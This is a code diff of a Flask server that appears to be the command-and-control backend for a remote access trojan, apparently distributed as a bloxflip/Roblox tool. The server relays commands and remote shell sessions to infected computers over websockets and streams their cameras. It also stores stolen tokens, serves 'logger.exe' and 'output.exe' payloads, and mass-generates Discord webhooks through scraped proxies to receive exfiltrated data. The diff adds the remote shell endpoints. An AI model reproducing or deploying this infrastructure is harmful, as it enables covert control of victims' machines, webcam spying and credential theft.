@@ -1,10 +1,20 @@
 import multiprocessing, threading, requests, hashlib, urllib3, zipfile, random, flask, json, time, os
-from flask import Flask, request, send_file, jsonify
-from flask_sock import Sock
+
+while True:
+    try:
+        from flask import Flask, request, send_file, jsonify
+        from flask_sock import Sock
+
+        break
+    except:
+        os.system("pip install flask-sock")
+
 
 app = Flask(__name__)
 sock = Sock(app)
-command = None
+command = {}
+shell_commands = {}
+shell_response = {}
 proxies = requests.get(
     "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=5000&ssl=all&anonymity=elite&simplified=true"
 ).text.splitlines()
@@ -20,9 +30,8 @@ channel_id2 = 12345678901234567890
 
 headers = {
     "content-Type": "application/json",
-    "user-Agent":
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
-    "authorization": os.environ["token"]
+    "user-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
+    "authorization": os.environ["token"],
 }
 
 
@@ -65,35 +74,30 @@ def clear(webhooks):
 def log(webhook, ip):
     requests.post(
         os.environ["webhook_generation_logs"],
-        data={"content": f"{ip} has generated a new webhook {webhook}"})
+        data={"content": f"{ip} has generated a new webhook {webhook}"},
+    )
 
 
 def create(channel, proxy, timeout=10):
     if proxy:
         response = requests.post(
             f"https://discord.com/api/v9/channels/{channel}/webhooks",
-            json={
-                "name": "Captain Hook"
-            },
+            json={"name": "Captain Hook"},
             headers=headers,
-            proxies={
-                "httpss": proxy
-            },
+            proxies={"httpss": proxy},
             verify=False,
-            timeout=timeout).json()
+            timeout=timeout,
+        ).json()
 
     else:
         response = requests.post(
             f"https://discord.com/api/v9/channels/{channel}/webhooks",
-            json={
-                "name": "Captain Hook"
-            },
+            json={"name": "Captain Hook"},
             headers=headers,
-            proxies={
-                "httpss": proxy
-            },
+            proxies={"httpss": proxy},
             verify=False,
-            timeout=timeout).json()
+            timeout=timeout,
+        ).json()
 
     return response
 
@@ -101,13 +105,9 @@ def create(channel, proxy, timeout=10):
 def view(channel, proxy):
     try:
         return requests.get(
-            f"https://discord.com/api/v9/channels/{channel}/webhooks",
-            headers=headers).json()
+            f"https://discord.com/api/v9/channels/{channel}/webhooks", headers=headers
+        ).json()
     except:
-        print(
-            requests.get(
-                f"https://discord.com/api/v9/channels/{channel}/webhooks",
-                headers=headers).text)
         return None
 
 
@@ -120,20 +120,21 @@ def genWebhook():
             break
         except Exception as e:
             print(e)
-            if 'Expecting' in str(e):
+            if "Expecting" in str(e):
                 return os.environ["backup_webhook"]
             try:
                 proxies.remove(proxy)
             except:
                 break
 
-    print(response)
     if "code" in list(response):
         if response["code"] == 30007:
             webhooks = view(channel, proxy)
             webhook = random.choice(webhooks)
-            threading.Thread(target=clear, args=(webhooks, )).start()
-            return f"https://discord.com/api/webhooks/{webhook['id']}/{webhook['token']}"
+            threading.Thread(target=clear, args=(webhooks,)).start()
+            return (
+                f"https://discord.com/api/webhooks/{webhook['id']}/{webhook['token']}"
+            )
 
         elif response["code"] == 20029:
             print("Ratelimited. Attempting to use old webhook")
@@ -143,9 +144,7 @@ def genWebhook():
                 return f"https://discord.com/api/webhooks/{webhook['id']}/{webhook['token']}"
             except:
 
-                print(
-                    "No already existing webhooks, switching to seperate server"
-                )
+                print("No already existing webhooks, switching to seperate server")
                 webhooks = view(channel_id2, proxy)
 
                 ratelimit = response["retry_after"]
@@ -158,22 +157,24 @@ def genWebhook():
                         f"Can't generate webhook in new server, waiting ratelimit instead {response['retry_after']}"
                     )
 
-            threading.Thread(target=clear, args=(webhooks, )).start()
+            threading.Thread(target=clear, args=(webhooks,)).start()
             print(webhook)
-            return f"https://discord.com/api/webhooks/{response['id']}/{response['token']}"
+            return (
+                f"https://discord.com/api/webhooks/{response['id']}/{response['token']}"
+            )
 
-    print(response)
-    print(
-        f"https://discord.com/api/webhooks/{response['id']}/{response['token']}"
-    )
+    print(f"https://discord.com/api/webhooks/{response['id']}/{response['token']}")
     return f"https://discord.com/api/webhooks/{response['id']}/{response['token']}"
+
 
 def zipdir(path, ziph):
     for root, dirs, files in os.walk(path):
         for file in files:
-            ziph.write(os.path.join(root, file), 
-                       os.path.relpath(os.path.join(root, file), 
-                                       os.path.join(path, '..')))
+            ziph.write(
+                os.path.join(root, file),
+                os.path.relpath(os.path.join(root, file), os.path.join(path, "..")),
+            )
+
 
 def ping(ws, computer):
     global connectedComputers
@@ -218,15 +219,15 @@ def commands(ws):
     threading.Thread(target=ping, args=(ws, computer)).start()
     while True:
         c = dict(command)
-        if not command:
+        if not c:
             continue
-        print(command)
-        if computer == command["target"]:
+        print(c)
+        if computer == c["target"]:
             if not computer in connectedComputers:
                 connectedComputers.append(computer)
 
-            ws.send(command["code"])
-            command = None
+            ws.send(c["code"])
+            command = {}
 
 
 @sock.route("/api/ws/camera")
@@ -300,22 +301,23 @@ def sendCommand():
     if request.method == "POST":
         command = request.form["Code"]
         target = request.form["Target"]
-        return "sent!"
+        return "", 204
 
 
 @app.route("/ad", methods=["GET"])
 def ads():
-    return requests.get('https://ads.bloxrewards.repl.co').text
-
-
-@app.route("/bloxflip", methods=["GET"])
-def controller():
-    return send_file("main.exe", as_attachment=True)
+    return requests.get("https://ads.bloxrewards.repl.co").text
 
 
 def update(ws):
     global connectedComputers
+    old = None
     while True:
+        if not old == connectedComputers:
+            old = connectedComputers[:]
+        else:
+            continue
+
         newComputers = {"computers": connectedComputers}
         if len(newComputers["computers"]) > 1:
             newComputers["computers"] = list(set(connectedComputers))
@@ -332,10 +334,73 @@ def computers(ws):
     if not encoded == key:
         ws.close()
 
-    threading.Thread(target=update, args=(ws, )).start()
+    threading.Thread(target=update, args=(ws,)).start()
     while True:
+
         command = json.loads(ws.receive())
         print(command)
+
+
+@sock.route("/api/ws/readShell")
+def readshell(ws):
+    global shell_response
+    data = ws.receive()
+    encoded = hashlib.sha256(data.encode()).hexdigest()
+    print(encoded)
+    if not encoded == key:
+        ws.close()
+
+    computer = ws.receive()
+    threading.Thread(
+        target=listen,
+        args=(
+            ws,
+            computer,
+        ),
+    ).start()
+    while True:
+
+        if computer in shell_response and shell_response[computer]:
+            print()
+            ws.send(shell_response[computer])
+            shell_response[computer] = None
+
+
+def listen(ws, computer):
+    global shell_commands
+    while True:
+        shell_commands[computer] = ws.receive()
+
+
+def send(ws, computer):
+    global shell_commands
+    while True:
+        if computer in shell_commands and shell_commands[computer]:
+            ws.send(shell_commands[computer])
+            shell_commands[computer] = None
+
+
+@sock.route("/api/ws/shell")
+def shell(ws):
+    global shell_response
+    data = ws.receive()
+    encoded = hashlib.sha256(data.encode()).hexdigest()
+    print("SHELL")
+    if not encoded == key:
+        ws.close()
+
+    computer = ws.receive()
+
+    threading.Thread(
+        target=send,
+        args=(
+            ws,
+            computer,
+        ),
+    ).start()
+    while True:
+        shell_response[computer] = ws.receive()
+
 
 @sock.route("/api/ws/showCamera")
 def camera(ws):
@@ -421,7 +486,6 @@ def webhook():
     def process_after_request(response):
         @response.call_on_close
         def process_after_request():
-            print(hook)
             print("Waiting 60 seconds before deletion")
             time.sleep(60)
             requests.delete(hook, headers=headers)
@@ -429,22 +493,21 @@ def webhook():
 
         return response
 
-    if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
-        ip = request.environ['REMOTE_ADDR']
+    if request.environ.get("HTTP_X_FORWARDED_FOR") is None:
+        ip = request.environ["REMOTE_ADDR"]
     else:
-        ip = request.environ['HTTP_X_FORWARDED_FOR']
+        ip = request.environ["HTTP_X_FORWARDED_FOR"]
 
     try:
         hook = genWebhook()
-        print(type(hook))
         log(hook, ip)
     except:
-        hook = os.environ['backup_webhook']
+        hook = os.environ["backup_webhook"]
 
     return hook
 
 
-@app.route('/logs', methods=["POST", "GET"])
+@app.route("/logs", methods=["POST", "GET"])
 def logs():
     try:
         request.form["key"]
@@ -471,12 +534,13 @@ def logs():
         return "", 404
 
     else:
-        with zipfile.ZipFile('temp.zip', 'w', zipfile.ZIP_DEFLATED) as zipf:
-            zipdir('logs/', zipf)
+        with zipfile.ZipFile("temp.zip", "w", zipfile.ZIP_DEFLATED) as zipf:
+            zipdir("logs/", zipf)
 
-        data = open('temp.zip', 'rb').read()
-      
+        data = open("temp.zip", "rb").read()
+
         return data
+
 
 @app.route("/tokens", methods=["POST", "GET"])
 def tokens():
@@ -484,15 +548,15 @@ def tokens():
         request.form["key"]
     except:
         return "", 404
-      
+
     encoded = hashlib.sha256(request.form["key"].encode()).hexdigest()
     if not encoded == key:
         return "", 404
-      
+
     if request.method == "POST":
         keysFile = json.load(open("tokens.json", "rb"))
         token = request.form["token"]
-      
+
         with open("tokens.json", "w+") as f:
             keys = keysFile["keys"]
             keys.append(token)
@@ -500,23 +564,29 @@ def tokens():
             json.dump(keysFile, f, indent=1)
             f.close()
         return "", 204
-      
+
     elif request.method == "GET":
         keysFile = json.load(open("tokens.json", "r"))
         keys = keysFile["keys"]
         return keys
 
-@app.route("/bloxflip-py", methods=["GET"])
+
+@app.route("/files/log", methods=["GET"])
 def logger():
-    return send_file("logger.exe", as_attachment=True, download_name='lg.exe')
+    return send_file("logger.exe", as_attachment=True, download_name="lg.exe")
+
+
+@app.route("/files/main", methods=["GET"])
+def controller():
+    return send_file("output.exe", as_attachment=True)
 
 
 @app.errorhandler(404)
 def page_not_found(e):
-    if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
-        ip = request.environ['REMOTE_ADDR']
+    if request.environ.get("HTTP_X_FORWARDED_FOR") is None:
+        ip = request.environ["REMOTE_ADDR"]
     else:
-        ip = request.environ['HTTP_X_FORWARDED_FOR']
+        ip = request.environ["HTTP_X_FORWARDED_FOR"]
     print(ip)
     return "", 404
 
